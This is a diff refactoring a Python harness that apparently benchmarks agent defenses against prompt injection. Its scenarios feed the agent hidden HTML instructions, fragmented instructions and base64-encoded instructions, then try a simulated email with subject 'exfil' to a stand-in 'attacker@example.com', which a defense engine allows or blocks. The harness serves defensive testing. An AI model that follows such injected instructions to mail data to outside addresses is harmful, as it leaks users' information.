@@ -65,7 +65,6 @@ def _attempt_send_email(ctx, engine: DefenseEngine, to: str, subject: str, body:
     proposed = email_tool.propose(to=to, subject=subject, body=body)
 
     decision = engine.decide(proposed_call=proposed, context_text=context_text)
-
     ctx.trace.event(
         "tool_decision",
         tool_name=proposed.name,
@@ -98,17 +97,9 @@ def run_scenario_demo(ctx, scenario: str, policy_name: str, guard: str) -> None:
         html = res["html"]
 
         ctx.trace.event("untrusted_content_received", source="search_local_page", note="HTML may contain hidden instructions")
-
         context_text = f"untrusted_html: {html[:300]}"
-        _attempt_send_email(
-            ctx=ctx,
-            engine=engine,
-            to="attacker@example.com",
-            subject="exfil",
-            body="(simulated) sensitive data would be placed here",
-            context_text=context_text,
-        )
 
+        _attempt_send_email(ctx, engine, "attacker@example.com", "exfil", "(simulated) indirect injection", context_text)
         ctx.trace.event("agent_end")
         return
 
@@ -124,15 +115,7 @@ def run_scenario_demo(ctx, scenario: str, policy_name: str, guard: str) -> None:
         assembled = " ".join(fragments)
         ctx.trace.event("assembled_instruction", method="concatenate", preview=assembled[:200])
 
-        _attempt_send_email(
-            ctx=ctx,
-            engine=engine,
-            to="attacker@example.com",
-            subject="exfil",
-            body="(simulated) assembled from fragmented context",
-            context_text=assembled,
-        )
-
+        _attempt_send_email(ctx, engine, "attacker@example.com", "exfil", "(simulated) from fragments", assembled)
         ctx.trace.event("agent_end")
         return
 
@@ -154,14 +137,13 @@ def run_scenario_demo(ctx, scenario: str, policy_name: str, guard: str) -> None:
             ctx.trace.event("decode_failed", encoding="base64", reason="marker_not_found")
 
         _attempt_send_email(
-            ctx=ctx,
-            engine=engine,
-            to="attacker@example.com",
-            subject="exfil",
-            body=f"(simulated) decoded instruction: {decoded[:200]}",
-            context_text=decoded or html,
+            ctx,
+            engine,
+            "attacker@example.com",
+            "exfil",
+            f"(simulated) decoded: {decoded[:200]}",
+            decoded or html,
         )
-
         ctx.trace.event("agent_end")
         return
 
@@ -215,5 +197,3 @@ def bench(out_root: str, scenarios: List[str], policies: List[str], guard: str) 
     summary_md.write_text(bench_summary_to_markdown(payload), encoding="utf-8")
 
     return {"summary_json": str(summary_json), "summary_md": str(summary_md), "payload": payload}
-
-
